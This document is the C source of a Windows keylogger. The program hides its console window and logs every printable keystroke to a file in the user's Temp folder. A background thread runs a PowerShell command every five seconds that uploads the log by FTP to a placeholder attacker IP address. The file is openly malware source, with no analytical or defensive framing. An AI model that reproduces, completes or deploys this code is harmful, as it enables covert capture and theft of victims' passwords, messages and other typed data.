#include <stdio.h>
#include <Windows.h>
#include <time.h>

// Exfil through powershell and ftp
void exfil(void* lparam)
{
    while (TRUE)
    {
        Sleep(5000);
        system("powershell -c \"(New-Object System.Net.WebClient).UploadFile('ftp://<ATTCKER IP>/keylog.txt','C:\\Users\\IONO\\AppData\\Local\\Temp\\Keylog.txt')");
    }
}



int main() {
    short key;
    HANDLE hThread;
    FILE* pFile;

    // Hide window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    remove("C:\\Users\\IONO\\AppData\\Local\\Temp\\Keylog.txt");

    // Create another thread to exfil and log at the same time
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exfil, NULL, 0, NULL);
   
    while (TRUE)
    {
        for (int i = 0; i < 256; i++)
        {
            key = GetAsyncKeyState(i);
            if (key & 0b1)
            {
               
                // filter non-printable ascii characters
                if ((i > 31 && i < 127) || i == 13 || i == 10 || i == 8)
                {
                    pFile = fopen("C:\\Users\\IONO\\AppData\\Local\\Temp\\Keylog.txt", "a+");
                    fprintf(pFile, "%c", (char)i);
                    if (i == '\b')
                     {
                        fprintf(pFile,"[BK]");
                    }
                    if (i == 13)
                    {
                        fprintf(pFile, "\n");
                    }
                    fclose(pFile);
                }

            }
        }

    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);


    return 0;
}
